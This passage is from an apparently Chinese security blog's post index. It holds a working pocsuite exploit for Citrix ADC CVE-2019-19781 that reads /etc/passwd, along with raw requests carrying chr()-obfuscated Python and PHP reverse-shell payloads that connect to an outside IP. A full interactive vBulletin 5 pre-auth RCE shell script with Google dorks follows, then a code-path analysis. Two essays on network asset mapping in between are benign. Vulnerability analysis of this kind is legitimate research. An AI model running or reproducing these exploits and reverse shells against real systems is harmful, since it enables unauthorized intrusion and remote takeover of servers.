use ssh tool(nsrecover/nsroot).PoC#!/usr/bin/python# -\\*- coding: utf-8 -\\*-# Time : 2020/1/10 10:28# Author : William Jones# File : poc2.py# Email : [[email protected]](/cdn-cgi/l/email-protection)# copyright: (c) 2020 by William Jones.# license: Apache2, see LICENSE for more details.# description: Life is Fantastic.import urlparsefrom pocsuite.api.poc import POCBasefrom pocsuite.api.poc import registerfrom pocsuite.api.poc import Outputfrom pocsuite.api.request import reqfrom pocsuite.api.utils import randomStrclass TestPOC(POCBase):    vulID = 'CVE-2019-19781'    version = ''    author = ''    vulDate = '2020-01-10'    createDate = '2020-01-10'    updateDate = '2020-01-10'    references = [        \"https://cert.360.cn/warning/detail?id=acd3738e106ab653ab2c27a93427eb67\"    ]    name = ''    appPowerLink = ''    appName = ''    appVersion = ''''''vulType = ''desc = ''''''samples = [ ]install\\_requires = \"\"    def \\_attack(self):        return self.\\_verify()    def \\_verify(self):        result = {}        self.raw\\_url = self.url        host = urlparse.urlparse(self.url).hostname        port = urlparse.urlparse(self.url).port        scheme = urlparse.urlparse(self.url).scheme        if port is None:            port = \"443\"        else:            port = str(port)        if \"https\" == scheme:            self.url = \"%s://%s\" % (scheme, host)        else:            self.url = \"%s://%s:%s\" % (scheme, host, port)        command = 'cat /etc/passwd'        res = self.run\\_cmd(command=command)        if \"root:\\*:0:0\" in res:            result[\"VerifyInfo\"] = {}            result[\"VerifyInfo\"][\"url\"] = self.url            result[\"VerifyInfo\"][\"passwd\"] = res            result[\"VerifyInfo\"][\"hosts\"] = self.run\\_cmd(\"cat /etc/hosts\")        return self.parse\\_output(result)    def run\\_cmd(self, command):        filename = randomStr(10)        return self.port\\_req(self.url, filename, command)    def port\\_req(self, url, filename, cmd):        newbm\\_url = url + '/vpn/../vpns/portal/scripts/newbm.pl'        headers = {            \"Connection\": \"close\",            \"NSC\\_USER\": \"../../../netscaler/portal/templates/%s\" % filename,            \"NSC\\_NONCE\": \"nsroot\"        }        payload = \"url=http://example.com&amp;title=\" + filename + \"&amp;desc=[% template.new('BLOCK' = 'print `\" + cmd + \"`') %]\"        try:            r = req.post(url=newbm\\_url, headers=headers, data=payload, verify=False, allow\\_redirects=False)        except Exception as e:            return None        if r.status\\_code == 200 and 'parent.window.ns\\_reload' in r.content:            return self.get\\_res(url, filename)        else:            return None    def get\\_res(self, url, filename):        xml\\_url = url + '/vpn/../vpns/portal/%s.xml' % filename        headers = {            \"NSC\\_USER\": \"nsroot\",            \"NSC\\_NONCE\": \"nsroot\"        }        res = None        try:            r = req.get(xml\\_url, headers=headers, verify=False)        except Exception as e:            return res        if r.status\\_code == 200:            res = r.content.split(\"&amp;#117;\")[0]        return res    def parse\\_output(self, result):        output = Output(self)        if result:            output.success(result)        else:            output.fail('Internet nothing returned')        return outputregister(TestPOC)The resultGet ShellUse PythonPOST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1Host: 192.168.81.168Connection: closeAccept-Encoding: gzip, deflateAccept: \\*/\\*User-Agent: python-requests/2.21.0NSC\\_NONCE: nsrootNSC\\_USER: ../../../netscaler/portal/templates/shellcodeContent-Length: 2693url=http://example.com&amp;title=12603aaf&amp;desc=[% template.new({'BLOCK'='print readpipe(chr(47) . chr(118) . chr(97) . chr(114) . chr(47) . chr(112) . chr(121) . chr(116) . chr(104) . chr(111) . chr(110) . chr(47) . chr(98) . chr(105) . chr(110) . chr(47) . chr(112) . chr(121) . chr(116) . chr(104) . chr(111) . chr(110) . chr(32) . chr(45) . chr(99) . chr(32) . chr(39) . chr(105) . chr(109) . chr(112) . chr(111) . chr(114) . chr(116) . chr(32) . chr(115) . chr(111) . chr(99) . chr(107) . chr(101) . chr(116) . chr(44) . chr(115) . chr(117) . chr(98) . chr(112) . chr(114) . chr(111) . chr(99) . chr(101) . chr(115) . chr(115) . chr(44) . chr(111) . chr(115) . chr(59) . chr(115) . chr(61) . chr(115) . chr(111) . chr(99) . chr(107) . chr(101) . chr(116) . chr(46) . chr(115) . chr(111) . chr(99) . chr(107) . chr(101) . chr(116) . chr(40) . chr(115) . chr(111) . chr(99) . chr(107) . chr(101) . chr(116) . chr(46) . chr(65) . chr(70) . chr(95) . chr(73) . chr(78) . chr(69) . chr(84) . chr(44) . chr(10) . chr(115) . chr(111) . chr(99) . chr(107) . chr(101) . chr(116) . chr(46) . chr(83) . chr(79) . chr(67) . chr(75) . chr(95) . chr(83) . chr(84) . chr(82) . chr(69) . chr(65) . chr(77) . chr(41) . chr(59) . chr(115) . chr(46) . chr(99) . chr(111) . chr(110) . chr(110) . chr(101) . chr(99) . chr(116) . chr(40) . chr(40) . chr(34) . chr(49) . chr(57) . chr(50) . chr(46) . chr(49) . chr(54) . chr(56) . chr(46) . chr(56) . chr(49) . chr(46) . chr(49) . chr(54) . chr(55) . chr(34) . chr(44) . chr(49) . chr(48) . chr(48) . chr(56) . chr(57) . chr(41) . chr(41) . chr(59) . chr(111) . chr(115) . chr(46) . chr(100) . chr(117) . chr(112) . chr(50) . chr(40) . chr(115) . chr(46) . chr(102) . chr(105) . chr(108) . chr(101) . chr(110) . chr(111) . chr(40) . chr(41) . chr(44) . chr(48) . chr(41) . chr(59) . chr(32) . chr(111) . chr(115) . chr(46) . chr(100) . chr(117) . chr(112) . chr(50) . chr(40) . chr(115) . chr(46) . chr(102) . chr(105) . chr(108) . chr(101) . chr(110) . chr(111) . chr(40) . chr(41) . chr(44) . chr(49) . chr(41) . chr(59) . chr(32) . chr(111) . chr(115) . chr(46) . chr(100) . chr(117) . chr(112) . chr(50) . chr(40) . chr(115) . chr(46) . chr(102) . chr(105) . chr(108) . chr(101) . chr(110) . chr(111) . chr(40) . chr(41) . chr(44) . chr(10) . chr(50) . chr(41) . chr(59) . chr(112) . chr(61) . chr(115) . chr(117) . chr(98) . chr(112) . chr(114) . chr(111) . chr(99) . chr(101) . chr(115) . chr(115) . chr(46) . chr(99) . chr(97) . chr(108) . chr(108) . chr(40) . chr(91) . chr(34) . chr(47) . chr(98) . chr(105) . chr(110) . chr(47) . chr(115) . chr(104) . chr(34) . chr(44) . chr(34) . chr(45) . chr(105) . chr(34) . chr(93) . chr(41) . chr(59) . chr(39))'})%]Use PHPPOST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1Host: 192.168.81.168Connection: closeAccept-Encoding: gzip, deflateAccept: \\*/\\*User-Agent: python-requests/2.21.0NSC\\_NONCE: nsrootNSC\\_USER: ../../../netscaler/portal/templates/phpcodeContent-Length: 930url=http://example.com&amp;title=12603aaf&amp;desc=[% template.new({'BLOCK'='print readpipe(chr(112) . chr(104) . chr(112) . chr(32) . chr(45) . chr(114) . chr(32) . chr(39) . chr(36) . chr(115) . chr(111) . chr(99) . chr(107) . chr(61) . chr(102) . chr(115) . chr(111) . chr(99) . chr(107) . chr(111) . chr(112) . chr(101) . chr(110) . chr(40) . chr(34) . chr(49) . chr(57) . chr(50) . chr(46) . chr(49) . chr(54) . chr(56) . chr(46) . chr(56) . chr(49) . chr(46) . chr(49) . chr(54) . chr(55) . chr(34) . chr(44) . chr(32) . chr(49) . chr(48) . chr(48) . chr(56) . chr(57) . chr(41) . chr(59) . chr(101) . chr(120) . chr(101) . chr(99) . chr(40) . chr(34) . chr(47) . chr(98) . chr(105) . chr(110) . chr(47) . chr(115) . chr(104) . chr(32) . chr(45) . chr(105) . chr(32) . chr(60) . chr(38) . chr(51) . chr(32) . chr(62) . chr(38) . chr(51) . chr(32) . chr(50) . chr(62) . chr(38) . chr(51) . chr(34) . chr(41) . chr(59) . chr(39))'})%]Reference[1] http://www.template-toolkit.org/[2] https://perl.apache.org/docs/2.0/user/handlers/http.html[3] https://www.linkedin.com/pulse/cve-2019-19781-patrick-coble/?published=t[4] https://www.mdsec.co.uk/2020/01/deep-dive-to-citrix-adc-remote-code-execution-cve-2019-19781[5] https://www.tripwire.com/state-of-security/vert/citrix-netscaler-cve-2019-19781-what-you-need-to-know[6] https://github.com/abw/Template2/blob/master/lib/Template/Service.pm[7] https://docs.citrix.com/en-us/citrix-hardware-platforms/sdx/initial-configuration.html"
  },
  
  {
    "title": "网络空间测绘设计与实现-指纹库篇",
    "url": "/posts/system/",
    "categories": "空间测绘",
    "tags": "空间测绘",
    "date": "2019-12-08 11:33:00 +0800",
    





    
    "snippet": "网络空间测绘中，指纹库管理是重要环节。以下是自己毕业设计 网络空间资产探测系统指纹库的实现：指纹库管理基本说明  通过过滤器检索：系统允许用户按IP地址、CIDR、域名、位置、组织、端口、服务等条件进行筛选。  通过关键字检索：用户可以在查询框中输入指纹库名称的部分关键词，支持模糊查找和精确查找。  组合条件检索：支持过滤器组合、关键字组合、以及过滤器与关键字的组合。  订阅检索：对未检索到...",
    "content": "网络空间测绘中，指纹库管理是重要环节。以下是自己毕业设计 网络空间资产探测系统指纹库的实现：指纹库管理基本说明  通过过滤器检索：系统允许用户按IP地址、CIDR、域名、位置、组织、端口、服务等条件进行筛选。  通过关键字检索：用户可以在查询框中输入指纹库名称的部分关键词，支持模糊查找和精确查找。  组合条件检索：支持过滤器组合、关键字组合、以及过滤器与关键字的组合。  订阅检索：对未检索到的查询，可发布订阅申请，由运维人员从数据源获取相应数据，并通知用户。  命中库展示：展示搜索命中的数据，包括搜索结果和聚合信息，如地址位置、组织、服务等。功能支持  指纹构建：基于正则表达构建指纹，支持字符串、正则、hash值、图片等多种格式。  标准化管理：对指纹进行标准化管理，支持新增、删除、查询、修改等操作，具备高可扩展性。  模糊查询、状态跟踪和分级分类管理：支持指纹库的模糊查询、状态跟踪和分级分类管理。资产数据库管理  资产综合检索：通过IP关联漏洞信息、域名信息、服务及组件等，支持过滤和组合条件检索。  指纹库检索：按私有编号、CVE编号、CNVD编号、CNNVD编号等进行过滤和组合检索。  功能支持：存储资产信息，标准化管理，支持批量导入导出，模糊查询和非结构化查询。特定行业关键资产库管理  查询与管理：支持特定行业网络资产数据的存储和查询，采用非结构化查询和模糊查询方式。  API接口支持：支持按各类检索条件向其他中心平台推送资产数据，数据保存周期超过五年。探测中间结果数据库管理  存储与查询：对探测中间结果数据进行存储和展示，支持非结构化查询、模糊查询、自定义标签等。  存储周期管理：利用消息队列系统设定数据库中探测中间结果的数据存储周期，通常为三个月或更长。结论通过对指纹库的全面管理和应用，网络空间测绘系统能够有效识别和追踪各类网络资产，为网络安全提供重要的数据支持和保障。该系统设计不仅注重功能的丰富性，还强调了数据的标准化管理和高可扩展性，使其能够适应不同的使用场景和需求。"
  },
  
  {
    "title": "网络空间测绘到底是个啥？",
    "url": "/posts/system-maping/",
    "categories": "空间测绘",
    "tags": "空间测绘",
    "date": "2019-10-08 11:33:00 +0800",
    





    
    "snippet": "前言随着计算机技术的不断进步，网络已经成为社会系统存续与发展的关键基础，网络空间俨然成为人类生产生活的“第二类生存空间”。网络空间内的资源日益丰富，不仅涵盖传统的设备、逻辑拓扑等软硬件基础设施，还包括网络用户、应用服务等多变的虚拟资源。一旦网络遭受破坏，几乎所有社会系统将无法正常运行或发挥功能。因此，迫切需要对网络空间进行高效管理、合理资源分配以及有效的安全监测和防护。工具如Shodan和F...",
    "content": "前言随着计算机技术的不断进步，网络已经成为社会系统存续与发展的关键基础，网络空间俨然成为人类生产生活的“第二类生存空间”。网络空间内的资源日益丰富，不仅涵盖传统的设备、逻辑拓扑等软硬件基础设施，还包括网络用户、应用服务等多变的虚拟资源。一旦网络遭受破坏，几乎所有社会系统将无法正常运行或发挥功能。因此，迫切需要对网络空间进行高效管理、合理资源分配以及有效的安全监测和防护。工具如Shodan和Fofa等已经成为识别和监测网络资产与漏洞的重要手段，为确保网络空间的安全提供了技术支持。为什么需要网络空间测绘地图自古以来就是运筹帷幄、指挥作战的重要工具，被称为指挥员的“眼睛”。然而，网络空间尚缺乏类似地理空间地图的、能够全面描述和展示网络空间信息的“网络地图”。类似于地理空间测绘，构建网络空间地图的技术称为“网络空间测绘”。网络空间资源测绘是对网络空间中的各类资源及其属性进行探测、融合分析和绘制的过程。通过网络探测、采集、处理、分析等方式，获得网络空间基础设施、用户及服务等网络资源在网络空间、地理空间以及社会空间的相关属性，并将这些属性以逻辑图和地理信息图的形式绘制出来，从而直观实时地反映出当前网络空间资源各个属性的状态和发展趋势。这不仅能够全面描述和展示网络空间信息，还能为各类应用（如网络资产评估、设备漏洞发现等）提供数据和技术支撑。老外们怎么做的美国的 “藏宝图计划”美国是最早进行网络空间资源测绘的国家，已经形成了较为完整的网络空间探测基础设施和体系。其中，美国国家安全局（NSA）和英国国家通信总局（GCHQ）于2012年联合开展的“藏宝图（TreasureMap）”计划，通过建立大规模互联网映射、探测和分析引擎系统，试图绘制出一张“近乎实时的、交互式的全球互联网地图”。这一计划的目标是能够描绘任何时间点互联网上的任何地点的任何设备，用于网络空间安全的态势感知、计算机攻击和网络侦查等。“X计划”美国国防高级研究计划局（DARPA）于2012年启动的“X计划”是基础性网络作战项目，旨在为国防部开发用于计划、实施和评估网络作战的平台。该项目持续时间约6年，总投资超过1.1亿美元，旨在从技术层面构建一个端对端的系统，使美军能够在实时、大规模的动态网络环境中理解、规划并管理网络战争。美国国土资源部的SHINE计划美国国土资源部（DHS）驱动的SHINE计划，旨在监控美国本土关键基础设施网络组件的安全状态，通过网际空间扫描引擎（Shodan）对本土关键行业网络进行安全态势感知，发现弱点设备和系统，并定期向其所有者推送安全通告，确保关键基础设施的网络安全。未来的展望基于当前技术和业务需求，未来的网络空间测绘系统需要具备以下能力：  构建面向未来的多源业务资产主动探测识别系统：有效发现、识别、获得网络空间中的各类资产信息，满足各业务线对网络空间资产的需求。  形成具备业务特色的主被动网络测绘标准、规范和知识库：建立符合业务逻辑和需求的测绘业务支撑平台。  深化主动测绘各个方向核心技术：借鉴国内外先进经验，加速推进网络测绘平台建设及核心技术研究。  落地测绘技术结合实际业务：深刻理解各业务处室的实际需求，形成贴合业务应用的网络测绘基础设施。总之，网络空间测绘技术在国家安全和军事领域具有十分广泛的应用前景。随着技术的不断发展，未来的网络空间测绘将为我们的网络安全提供更加坚实的保障。参考[1] 网络空间资源测绘:概念与技术"
  },
  
  {
    "title": "vBulletin5 RCE",
    "url": "/posts/vBulletin5-rce/",
    "categories": "vulnerability, vBulletin5",
    "tags": "RCE",
    "date": "2019-10-08 11:33:00 +0800",
    





    
    "snippet": "PrefaceRCE漏洞PoC被公开，该漏洞利用简单，可以直接在受害者服务中执行php代码。影响Vbulletin5.0.0至5.5.4版本，国外使用的较多。PoC如下：#!/usr/bin/python## vBulletin 5.x 0day pre-auth RCE exploit# # This should work on all versions from 5.0.0 till ...",
    "content": "PrefaceRCE漏洞PoC被公开，该漏洞利用简单，可以直接在受害者服务中执行php代码。影响Vbulletin5.0.0至5.5.4版本，国外使用的较多。PoC如下：#!/usr/bin/python## vBulletin 5.x 0day pre-auth RCE exploit# # This should work on all versions from 5.0.0 till 5.5.4## Google Dorks:# - site:*.vbulletin.net# - \"Powered by vBulletin Version 5.5.4\"import requestsimport sysif len(sys.argv) != 2:  sys.exit(\"Usage: %s &lt;URL to vBulletin&gt;\" % sys.argv[0])params = {\"routestring\":\"ajax/render/widget_php\"}while True:  try:    cmd = raw_input(\"vBulletin$ \")    params[\"widgetConfig[code]\"] = \"echo shell_exec('\"+cmd+\"'); exit;\"    r = requests.post(url = sys.argv[1], data = params)    if r.status_code == 200:      print r.text      else:      sys.exit(\"Exploit failed! :(\")except KeyboardInterrupt:sys.exit(\" nClosing shell...\")except Exception, e:sys.exit(str(e))Analysis本次使用的版本为5.4.5，26日有人发布了一个临时补丁 链接：https://gist.github.com/nickcano/4b8dbc93c463f9e2c983d03ceae61774   function evalCode($code)   {       ob_start();       // comment out. idk what it breaks but it's a fix for now       //eval($code);       $output = ob_get_contents();       ob_end_clean();       return $output;   }evalCode函数位于 includes/vb5/frontend/controller/bbcode.php 中作为 vB5_Frontend_Controller_Bbcode类的一个方法存在。可以看到把 eval($code)给注释了，证明这里是漏洞的触发点。在看一下payload，POST提交了一下参数：routestring=ajax/render/widget_phpwidgetConfig[code]=echo shell_exec('cmd'); exit;将上述数据提交到index.php，vbulletin会创建app对象来进行处理。 //For a few set routes we can run a streamlined function.   if (vB5_Frontend_ApplicationLight::isQuickRoute())   {       $app = vB5_Frontend_ApplicationLight::init('config.php');       vB5_Frontend_ExplainQueries::initialize();       if ($app-&gt;execute())       {           vB5_Frontend_ExplainQueries::finish();           exit();       }   }在调用isQuickRoute静态方法检查是否可以处理快路由后，创建出通过加载config.php vB5_Frontend_ApplicationLight的对象。isQuickRoute 中检查了当前路由，我们输入的 routestring=ajax/render/widget_php 刚好满足条件返回True。   foreach (self::$quickRoutePrefixMatch AS $prefix =&gt; $route)   {       if (substr($_REQUEST['routestring'], 0, strlen($prefix)) == $prefix)       {           return true;       }   }   // ++++++++另一部分+++++++   protected static $quickRoutePrefixMatch = array(       'ajax/apidetach' =&gt; array(           'handler'     =&gt; 'handleAjaxApiDetached',           'static'      =&gt; false,           'requirePost' =&gt; true,       ), // note, keep this before ajax/api. More specific routes should come before       // less specific ones, to allow the prefix check to work correctly, see constructor.       'ajax/api' =&gt; array(           'handler'     =&gt; 'handleAjaxApi',           'static'      =&gt; false,           'requirePost' =&gt; true,       ),       'ajax/render' =&gt; array(           'handler'     =&gt; 'callRender',           'static'      =&gt; false,           'requirePost' =&gt; true,       ),   );来到 execute 中,以下代码解释了为什么需要POST提交payload。并且可以看到 $this-&gt;application['handler'] 此时为 callRender 方法   // vB5_Frontend_ApplicationLight 类构造方法部分代码   foreach (self::$quickRoutePrefixMatch AS $prefix =&gt; $route)   {       if (substr($_REQUEST['routestring'], 0, strlen($prefix)) == $prefix)       {           $this-&gt;application = $route;           return true;       }   }   // execute 方法部分代码   if ($this-&gt;application['requirePost'])   {       if (strtoupper($_SERVER['REQUEST_METHOD']) !== 'POST')       {           throw new vB5_Exception('Incorrect HTTP Method. Please use a POST request.');       }       // Also require a CSRF token check.       static::checkCSRF();   }   $serverData = array_merge($_GET, $_POST);   if (!empty($this-&gt;application['handler']) AND method_exists($this, $this-&gt;application['handler']))   {       $app = $this-&gt;application['handler'];       call_user_func(array($this, $app), $serverData);       return true;   }然后将payload，通过调用 includes vb5 template.php， Template中staticRenderAjax 静态方法传入。$this-&gt;sendAsJson(vB5_Template::staticRenderAjax($routeInfo[2], $serverData));之后来到 vB5_Template 的 render 方法，通过 extract 方法将传入的数据添加之当前的符号表中，也就是说创建了一个名为 widgetConfig[code] 的变量，值为 echo shell_exec(‘cmd’); exit; 。之后加载模板进行渲染，在下面代码中使用eval执行模板   if(is_array($templateCode) AND !empty($templateCode['textonly']))   {       $final_rendered = $templateCode['placeholder'];   }   else if($templateCache-&gt;isTemplateText())   {       eval($templateCode);   }生成的模板为   &lt;?php   $final_rendered = '' . ''; if (empty($widgetConfig) AND !empty($widgetinstanceid)) {       $final_rendered .= '       ' . ''; $widgetConfig = vB5_Template_Runtime::parseData('widget', 'fetchConfig', $widgetinstanceid); $final_rendered .= '' . '   ';   } else {       $final_rendered .= '';   }$final_rendered .= '' . '   ' . ''; if (!empty($widgetConfig)) {       $final_rendered .= '       ' . ''; $widgetid = $widgetConfig['widgetid']; $final_rendered .= '' . '       ' . ''; $widgetinstanceid = $widgetConfig['widgetinstanceid']; $final_rendered .= '' . '   ';   } else {       $final_rendered .= '';   }$final_rendered .= '' . '   &lt;div class=\"b-module' . vB5_Template_Runtime::vBVar($widgetConfig['show_at_breakpoints_css_classes']) . ' canvas-widget default-widget custom-html-widget\" id=\"widget_' . $widgetinstanceid . '\" data-widget-id=\"' . $widgetid . '\" data-widget-instance-id=\"' . $widgetinstanceid . '\"&gt;       ' . vB5_Template_Runtime::includeTemplate('module_title',array('widgetConfig' =&gt; $widgetConfig, 'show_title_divider' =&gt; '1', 'can_use_sitebuilder' =&gt; $user['can_use_sitebuilder'])) . '       &lt;div class=\"widget-content\"&gt;           ' . ''; if (!empty($widgetConfig['code']) AND !vB::getDatastore()-&gt;getOption('disable_php_rendering')) {       $final_rendered .= '               ' . ''; $evaledPHP = vB5_Template_Runtime::parseAction('bbcode', 'evalCode', $widgetConfig['code']); $final_rendered .= '' . '               ' . $evaledPHP . '           ';   } else {       $final_rendered .= '               ' . ''; if ($user['can_use_sitebuilder']) {           $final_rendered .= '                   &lt;span class=\"note\"&gt;' . vB5_Template_Runtime::parsePhrase(\"click_edit_to_config_module\") . '&lt;/span&gt;               ';       } else {           $final_rendered .= '';       }$final_rendered .= '' . '           ';   }$final_rendered .= '' . '       &lt;/div&gt;   &lt;/div&gt;';其中部分代码中可以看到 widgetConfig[‘code’] 被执行，通过 vB5_Template_Runtime 的静态方法parseAction 调用vB5_Frontend_Controller_Bbcode中的evalCode方法，payload得到执行。$evaledPHP = vB5_Template_Runtime::parseAction('bbcode', 'evalCode', $widgetConfig['code']);   public static function parseAction()   {       $arguments = func_get_args();       $controller = array_shift($arguments);       $method = array_shift($arguments);       $controller = str_replace(':', '.', $controller);       $class = vB5_Frontend_Routing::getControllerClassFromName($controller);       if (!class_exists($class) || !method_exists($class, $method))       {           return null;       }       $result =  call_user_func_array(array($class, $method), $arguments);           return $result;   }整个调用栈如下:  vB5_Frontend_Controller_Bbcode 执行 evalCode，其中eval执行代码  vB5_Template_Runtime 中执行parseAction方法，调用vB5_Frontend_Controller_Bbcode  vB5_Template 中render方法通过eval执行模板代码  vB5_Template staticRenderAjax 调用 staticRender 调用 render  vB5_Frontend_ApplicationLight中calllRender调用vB5_Template中staticRenderAjax  vB5_Frontend_ApplicationLight中execute 调用calllRender  index.php 调用vB5_Frontend_ApplicationLight中execute方法Reference[1] https://gist.github.com/nickcano/4b8dbc93c463f9e2c983d03ceae61774[2] https://seclists.org/fulldisclosure/2019/Sep/31"
  }
  
]

